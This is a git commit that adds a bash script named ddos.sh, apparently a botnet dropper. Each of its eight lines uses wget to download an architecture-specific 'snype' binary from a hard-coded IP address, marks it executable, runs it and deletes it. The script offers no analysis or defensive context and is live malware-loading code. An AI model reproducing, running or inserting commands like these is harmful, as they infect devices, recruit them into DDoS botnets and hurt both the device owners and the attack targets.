dfbc15e0899552ecfd654e1a709f52ea41be62ea
rkr104 <rkr29730@gmail.com>
2024-08-31 14:18:16 +0530

    Add files via upload

---
+++ ddos.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.mips; chmod +x snype.mips; ./snype.mips; rm -rf snype.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.mpsl; chmod +x snype.mpsl; ./snype.mpsl; rm -rf snype.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.x86; chmod +x snype.x86; ./snype.x86; rm -rf snype.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.ppc; chmod +x snype.ppc; ./snype.ppc; rm -rf snype.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.sparc; chmod +x snype.sparc; ./snype.sparc; rm -rf snype.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.arm4; chmod +x snype.arm4; ./snype.arm4; rm -rf snype.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.arm5; chmod +x snype.arm5; ./snype.arm5; rm -rf snype.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.108/snype.arm6; chmod +x snype.arm6; ./snype.arm6; rm -rf snype.arm6
